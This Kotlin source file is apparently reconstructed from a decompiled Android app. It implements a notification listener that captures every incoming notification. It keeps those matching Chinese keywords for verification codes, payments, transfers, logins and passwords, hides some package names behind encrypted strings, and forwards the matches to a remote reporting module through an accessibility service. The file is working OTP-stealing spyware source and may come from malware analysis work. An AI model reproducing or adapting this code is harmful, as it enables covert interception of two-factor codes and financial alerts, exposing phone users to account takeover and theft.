package com.storm.safe.rock.service

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.util.StringUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * NotificationListenerService that intercepts, filters, and reports notifications.
 *
 * Reverse-engineered from JADX: service/sqlszawlrvc.java (375 LOC).
 *
 * Behaviors:
 * - Intercepts all posted notifications
 * - Filters out excluded packages (system apps, own package)
 * - Matches notification content against keyword list
 * - Deduplicates with 5-minute window using LinkedHashMap
 * - Reports matching notifications to NetworkManager via JSON
 * - Maps known package names to friendly app names
 */
class sqlszawlrvc : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationMonitor"

        /** Dedup window: 5 minutes */
        private const val DEDUP_WINDOW_MS = 300_000L

        /** Cache expiry: 10 minutes */
        private const val CACHE_EXPIRY_MS = 600_000L

        /** Delay after listener connected before processing */
        private const val CONNECT_DELAY_MS = 1_000L

        /** Volatile singleton instance */
        @Volatile
        private var instance: sqlszawlrvc? = null

        /** Recent notification dedup map: key → timestamp */
        @JvmStatic
        val recentNotifications: LinkedHashMap<String, Long> = LinkedHashMap()

        /** Lock for dedup map */
        private val dedupLock = Any()

        /** Keywords to match in notification content */
        @JvmStatic
        val NOTIFICATION_KEYWORDS: List<String> = listOf(
            "验证码", "动态码", "验证", "OTP", "校验码",
            "转账", "付款", "收款", "支付", "到账", "扣款", "汇款", "余额", "消费", "交易",
            "登录", "登陆", "异常登录", "异地登录",
            "密码", "修改密码", "重置密码",
            "中奖", "领取", "红包", "奖励",
            "快递", "已发货", "已签收", "取件",
            "通知", "提醒", "警告", "预警"
        )

        /** Packages to exclude from notification capture */
        @JvmStatic
        val EXCLUDED_PACKAGES: Set<String> = setOf(
            "com.storm.safe.rock",
            "android",
            "com.android.systemui",
            "com.android.settings",
            "com.android.phone",
            "com.android.launcher",
            "com.android.launcher3",
            "com.google.android.gms",
            "com.google.android.gsf",
            StringUtil.decrypt("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="),
            StringUtil.decrypt("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"),
            StringUtil.decrypt("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="),
            StringUtil.decrypt("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo=")
        )

        /** Map of known package names to friendly app names */
        @JvmStatic
        val APP_NAME_MAP: Map<String, String> = mapOf(
            "com.tencent.mm" to "微信",
            "com.tencent.mobileqq" to "QQ",
            "com.alibaba.android.rimet" to "钉钉",
            "com.alipay.android.app" to "支付宝",
            "com.eg.android.AlipayGphone" to "支付宝",
            "com.taobao.taobao" to "淘宝",
            "com.jd.app.reader" to "京东",
            "com.jingdong.app.mall" to "京东",
            "com.meituan.movie" to "美团",
            "com.sankuai.meituan" to "美团",
            "com.eleme.android" to "饿了么",
            "com.baidu.BaiduMap" to "百度地图",
            "com.autonavi.minimap" to "高德地图",
            "com.pinduoduo.android" to "拼多多",
            "com.xunmeng.pinduoduo" to "拼多多",
            "com.douyin.aweme" to "抖音",
            "com.zhiliaoapp.musically" to "TikTok",
            "com.ss.android.ugc.aweme" to "抖音",
            "com.kuaishou.nebula" to "快手",
            "tv.danmaku.bili" to "哔哩哔哩",
            "com.weibo.android" to "微博",
            "com.sina.weibo" to "微博",
            "com.netease.cloudmusic" to "网易云音乐",
            "com.tencent.qqmusic" to "QQ音乐",
            "com.android.mms" to "短信",
            "com.android.messaging" to "短信",
            "com.google.android.apps.messaging" to "短信",
            StringUtil.decrypt("KFYcdEUtDTlSOGVUFCleOQsr") to "短信",
            StringUtil.decrypt("KFYcdEAxGScZPCZK") to "短信",
            "com.samsung.android.messaging" to "短信",
            StringUtil.decrypt("KFYcdEIoHCEZPC5KAjtKPQ==") to "短信",
            StringUtil.decrypt("KFYcdFsxGiEZPC5KAjtKPQ==") to "短信"
        )

        @JvmStatic
        fun getInstance(): sqlszawlrvc? = instance

        /**
         * Check if notification listener is enabled for this app.
         * JADX: C0377a0.isNotificationListenerEnabled
         */
        @JvmStatic
        fun isNotificationListenerEnabled(context: Context): Boolean {
            return try {
                val flat = Settings.Secure.getString(
                    context.contentResolver, "enabled_notification_listeners"
                ) ?: return false
                flat.contains(context.packageName)
            } catch (_: Exception) {
                false
            }
        }

        /**
         * Open notification listener settings activity.
         * JADX: C0377a0.openNotificationListenSettings
         */
        @JvmStatic
        fun openNotificationListenSettings(context: Context) {
            try {
                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            } catch (_: Exception) {
                // Silently fail
            }
        }
    }

    private var serviceScope: CoroutineScope? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        serviceScope?.cancel()
        serviceScope = null
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "通知监听已就绪")
        serviceScope?.launch {
            delay(CONNECT_DELAY_MS)
            // Clear dedup cache on reconnect
            synchronized(dedupLock) {
                recentNotifications.clear()
            }
        }
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "通知监听已断开")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val packageName = sbn.packageName ?: return

        // Check excluded packages
        if (isPackageExcluded(packageName)) return

        // Filter com.android.* unless it's in our app name map
        if (packageName.startsWith("com.android.") && !APP_NAME_MAP.containsKey(packageName)) {
            return
        }

        // Extract notification content
        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getString("android.title", "") ?: ""
        var bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        // Prefer bigText, fall back to text
        if (bigText.isBlank()) {
            bigText = text
        }

        // Skip if both title and content are empty
        if (title.isBlank() && bigText.isBlank()) return

        // Check if notification matches any keyword
        val combined = "$title $bigText"
        val matchedKeyword = NOTIFICATION_KEYWORDS.firstOrNull { combined.contains(it) }
            ?: return

        // Build dedup key
        val dedupKey = "$packageName|$title|$bigText"
        val now = System.currentTimeMillis()

        synchronized(dedupLock) {
            // Check dedup window
            val lastTime = recentNotifications[dedupKey]
            if (lastTime != null && (now - lastTime) < DEDUP_WINDOW_MS) {
                return
            }

            // Record and clean expired entries
            recentNotifications[dedupKey] = now
            recentNotifications.entries.removeAll { (now - it.value) > CACHE_EXPIRY_MS }

            // Resolve app name
            val appName = APP_NAME_MAP[packageName] ?: packageName
            val source = "【${appName}】"

            // Format notification text
            val formattedText = if (title.isNotBlank() && bigText.isNotBlank()) {
                "【${title}】$bigText"
            } else if (title.isBlank()) {
                bigText
            } else {
                title
            }

            Log.d(TAG, "命中通知[$matchedKeyword] $appName: $formattedText")

            // Report to NetworkManager
            serviceScope?.launch {
                reportNotification(source, formattedText, sbn, packageName)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // No-op per JADX
    }

    /**
     * Check if a package is in the exclusion list.
     */
    private fun isPackageExcluded(packageName: String): Boolean {
        for (excluded in EXCLUDED_PACKAGES) {
            if (packageName == excluded) return true
            if (packageName.startsWith("$excluded.")) return true
        }
        return false
    }

    /**
     * Report a notification to the NetworkManager.
     * JADX: C03793.invokeSuspend
     */
    private fun reportNotification(
        source: String,
        text: String,
        sbn: StatusBarNotification,
        packageName: String
    ) {
        try {
            val service = MyAccessibilityService.getInstance() ?: return
            val networkManager = service.getNetworkManager() ?: return

            val json = JSONObject().apply {
                put("number", source)
                put("text", text)
                put("timestamp", sbn.postTime)
                put("type", "notification")
                put("source", packageName)
            }
            // vendor: JADX C03793.invokeSuspend → NetworkManager.m211659c5 (sendIncomingSms)
            networkManager.sendIncomingSms(json)
        } catch (e: Exception) {
            Log.e(TAG, "上报通知失败", e)
        }
    }
}
